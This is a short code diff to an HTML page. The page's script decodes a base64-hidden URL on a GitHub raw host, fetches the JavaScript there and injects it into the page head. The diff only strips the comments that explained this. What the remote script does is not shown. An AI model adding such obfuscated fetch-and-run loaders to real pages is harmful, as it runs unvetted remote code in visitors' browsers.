@@ -8,16 +8,16 @@
     const base64EncodedURL = "aHR0cHM6Ly9yYXcuZ2l0aHViY29udGVudC5jb20vbHR0MjAzL3h1bmppYW4vbWFpbi9jb250ZW50Lmpz";
     const decodedURL = atob(base64EncodedURL);
 
-    // 使用 fetch 加载来自不同仓库的 content.js
+    
     fetch(decodedURL)
-      .then(res => res.text())  // 获取纯文本的 JavaScript 内容
+      .then(res => res.text())  
       .then(script => {
         const s = document.createElement('script');
-        s.textContent = script;  // 将脚本内容添加到新创建的 <script> 元素中
-        document.head.appendChild(s);  // 将脚本插入到 <head> 中
+        s.textContent = script;  
+        document.head.appendChild(s);  
         console.log('Script injected!');
       })
-      .catch(console.error);  // 如果出现错误，输出错误信息
+      .catch(console.error);  
   </script>
 </head>
 <body>
